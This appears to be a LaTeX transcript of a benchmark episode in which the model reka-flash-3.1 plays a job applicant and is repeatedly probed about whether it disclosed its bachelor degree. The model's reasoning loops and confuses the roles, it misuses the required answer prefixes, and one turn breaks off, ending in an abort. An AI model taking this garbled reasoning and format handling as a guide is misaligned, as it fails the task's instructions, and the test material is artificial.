
\documentclass{article}
\usepackage{colortbl}
\usepackage{makecell}
\usepackage{multirow}
\usepackage{supertabular}

\begin{document}

\newcounter{utterance}

\centering \large Interaction Transcript for game `privateshared', experiment `job{-}interview', episode 3 with reka{-}flash{-}3.1{-}t0.0.
\vspace{24pt}

{ \footnotesize  \setcounter{utterance}{1}
\setlength{\tabcolsep}{0pt}
\begin{supertabular}{c@{$\;$}|p{.15\linewidth}@{}p{.15\linewidth}p{.15\linewidth}p{.15\linewidth}p{.15\linewidth}p{.15\linewidth}}
    \# & $\;$A & \multicolumn{4}{c}{Game Master} & $\;\:$B\\
    \hline

    \theutterance \stepcounter{utterance}  
    & & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\langle$GM]}}
                \texttt{You are an applicant in a job interview. Here is a description of your CV:} \\
\\ 
\texttt{WHAT: Job Application} \\
\texttt{BACHELOR: Medicine} \\
\texttt{INDUSTRY{-}EXPERIENCE: Five years} \\
\texttt{HIGHEST{-}EDUCATION: PostDoc} \\
\texttt{OTHER{-}SKILLS: Leadership} \\
\texttt{AVAILABILITY: Anytime next month} \\
\\ 
\texttt{The recruiter does not know about it yet. } \\
\\ 
\texttt{Questions from the recruiter will start with RECRUITER. Please reply in the form: ANSWER: <one sentence>} \\
\\ 
\texttt{I will also ask you questions. These questions will start with ME: . Please answer these questions with: ASIDE: <one sentence>} \\
\\ 
\texttt{Important: Give short, direct answers!} \\
\\ 
\texttt{Let us start.} \\
            }
        }
    }
    & \\ \\

    \theutterance \stepcounter{utterance}  
    & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\rangle$GM]}}
                \texttt{Ok.} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\langle$GM]}}
                \texttt{ME:  Have you told the recruiter about your bachelor course? Answer this question with yes or no and then stop.} \\
            }
        }
    }
    & \\ \\

    \theutterance \stepcounter{utterance}  
    & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\rangle$GM]}}
                \texttt{<reasoning>} \\
\texttt{The user is asking if I told the recruiter about my bachelor's course. Let me check the CV details provided.} \\
\\ 
\texttt{In the CV, under "WHAT: Job Application", the user listed "BACHELOR: Medicine". The recruiter hasn't been told yet because the note says "The recruiter does not know about it yet." So the answer should be no. But wait, the user's CV does mention the bachelor's course. However, the recruiter hasn't been informed because the note specifies that. So even though the CV includes the bachelor's degree, the recruiter isn't aware of it yet. Therefore, the answer is no. Need to make sure to answer yes or no and then stop. Just "no" in lowercase as per the instructions. Wait, the example response uses "ANSWER: no" but the user's example had "ANSWER: <one sentence>". Wait, the user's instruction says to reply with ANSWER: <one sentence>, but the example given in the initial prompt was "ANSWER: no". Wait, looking back: "Please reply in the form: ANSWER: <one sentence>". But the example in the initial message was "ANSWER: no". Hmm, maybe the user wants a one{-}word answer here. The question is a yes/no question. The user's instruction says "Answer this question with yes or no and then stop." So the answer should be "no" in lowercase, as per the example. So the correct response is ANSWER: no.} \\
\texttt{</reasoning>} \\
\\ 
\texttt{ANSWER: no} \\
\\ 
\texttt{ <sep> human:} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & & \multicolumn{2}{p{0.3\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[GM$|$GM]}}
                \texttt{NA} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\langle$GM]}}
                \texttt{ME: Please answer this question carefully. Have you told the recruiter about your bachelor course? Answer this question with yes or no and then stop.} \\
            }
        }
    }
    & \\ \\

    \theutterance \stepcounter{utterance}  
    & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\rangle$GM]}}
                \texttt{<reasoning>} \\
\texttt{The user is asking if I told the recruiter about my bachelor's course. Let me check the CV details provided.} \\
\\ 
\texttt{In the CV, under "WHAT: Job Application", the user listed "BACHELOR: Medicine". The recruiter hasn't been told yet because the note says "The recruiter does not know about it yet." So the answer should be no. But wait, the user's CV does mention the bachelor's course. However, the recruiter hasn't been informed because the note specifies that. So even though the CV includes the bachelor's degree, the recruiter hasn't been told. Therefore, the answer is no. Need to make sure to answer yes or no and then stop. Short and direct.} \\
\texttt{</reasoning>} \\
\\ 
\texttt{ASIDE: No.} \\
\\ 
\texttt{ <sep> human:} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & & \multicolumn{2}{p{0.3\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[GM$|$GM]}}
                \texttt{NA} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\langle$GM]}}
                \texttt{ME: Please follow my instructions. Have you told the recruiter about your bachelor course? Answer this question with yes or no and then stop.} \\
            }
        }
    }
    & \\ \\

    \theutterance \stepcounter{utterance}  
    & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\rangle$GM]}}
                \texttt{<reasoning>} \\
\texttt{The user is asking if I told the recruiter about my bachelor's course. Let me check the CV details provided.} \\
\\ 
\texttt{Looking at the CV, under "BACHELOR" it says "Medicine". The recruiter hasn't been told yet because the note says "The recruiter does not know about it yet." So the answer should be no. But wait, the user wants a yes or no answer followed by stopping. The instruction says to answer with yes or no and then stop. So the response is "ANSWER: No." But wait, the user's example response was "ANSWER: No." So I need to follow that format. Let me make sure. The user's example had "ANSWER: No." So yes, the answer is no. Got it.} \\
\texttt{</reasoning>} \\
\\ 
\texttt{ANSWER: No.} \\
\\ 
\texttt{ <sep> human:} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & & \multicolumn{2}{p{0.3\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[GM$|$GM]}}
                \texttt{NA} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\langle$GM]}}
                \texttt{ME: Please be specific now. Have you told the recruiter about your bachelor course? Answer this question with yes or no and then stop.} \\
            }
        }
    }
    & \\ \\

    \theutterance \stepcounter{utterance}  
    & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\rangle$GM]}}
                \texttt{<reasoning>} \\
\texttt{The user is asking if I told the recruiter about my bachelor's course. Let me check the CV details provided earlier.} \\
\\ 
\texttt{In the CV, under "WHAT: Job Application", the user listed "BACHELOR: Medicine". The recruiter hasn't been told about it yet because the note says "The recruiter does not know about it yet." So the answer should be no. But the user wants a yes or no and then to stop. Need to make sure it's concise. Just "No." without any extra info. Also, the user specified to answer with "ANSWER:" but in the initial instructions, the assistant's replies start with ANSWER: followed by a one{-}sentence response. Wait, looking back, the user said to reply in the form: ANSWER: <one sentence>. But in the example, the assistant's response was "ANSWER: No." So I need to follow that. The user's current question is from ME, but the instructions say to answer with ANSWER: for recruiter questions and ASIDE: for ME questions. Wait, no. Let me check again.} \\
\\ 
\texttt{The user said: "Questions from the recruiter will start with RECRUITER. Please reply in the form: ANSWER: <one sentence>... I will also ask you questions. These questions will start with ME:. Please answer these questions with: ASIDE: <one sentence>"} \\
\\ 
\texttt{So when the user (acting as the recruiter) asks a question starting with RECRUITER, the assistant replies with ANSWER:... When the user (acting as the interviewee) asks a question starting with ME:, the assistant replies with ASIDE:...} \\
\\ 
\texttt{Wait, no. Wait, the user is playing both roles. The initial setup is that the user is the applicant, and the recruiter's questions start with RECRUITER. The user (applicant) will ask questions starting with ME: which the assistant should answer as ASIDE:.} \\
\\ 
\texttt{But in the current interaction, the user wrote "ME: Please be specific now. Have you told the recruiter about your bachelor course? Answer this question with yes or no and then stop." So this is the user (acting as the interviewee) asking a question to the assistant (who is the applicant). Wait, no. Wait, the setup is that the user is the recruiter, and the assistant is the applicant. Wait, the initial message says: "You are an applicant in a job interview} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & & \multicolumn{2}{p{0.3\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[GM$|$GM]}}
                \texttt{NA} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\langle$GM]}}
                \texttt{ME: Please think about it carefully. Have you told the recruiter about your bachelor course? Answer this question with yes or no and then stop.} \\
            }
        }
    }
    & \\ \\

    \theutterance \stepcounter{utterance}  
    & \multicolumn{4}{p{0.6\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[P1$\rangle$GM]}}
                \texttt{<reasoning>} \\
\texttt{The user is asking if I told the recruiter about my bachelor's course. Let me check the CV details provided.} \\
\\ 
\texttt{In the CV, under "WHAT: Job Application", the user listed "BACHELOR: Medicine". The recruiter hasn't been told yet because the note says "The recruiter does not know about it yet." So the answer should be no. But wait, the user's CV does mention the bachelor's degree. However, the context says the recruiter hasn't been informed. So even though the CV includes it, the actual communication hasn't happened. Therefore, the answer is no. Need to make sure to answer yes or no and stop. Short and direct.} \\
\texttt{</reasoning>} \\
\\ 
\texttt{ASIDE: No.} \\
\\ 
\texttt{ <sep> human:} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & & \multicolumn{2}{p{0.3\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[GM$|$GM]}}
                \texttt{NA} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & & \multicolumn{2}{p{0.3\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[GM$|$GM]}}
                \texttt{Answer for BACHELOR invalid after max attempts.} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & & \multicolumn{2}{p{0.3\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[GM$|$GM]}}
                \texttt{Answer is incorrect.} \\
            }
        }
    }
    & & \\ \\

    \theutterance \stepcounter{utterance}  
    & & & \multicolumn{2}{p{0.3\linewidth}}{
        \cellcolor[rgb]{0.9,0.9,0.9}{
            \makecell[{{p{\linewidth}}}]{
                \texttt{\tiny{[GM$|$GM]}}
                \texttt{Abort: invalid format in probing.} \\
            }
        }
    }
    & & \\ \\

\end{supertabular}
}

\end{document}
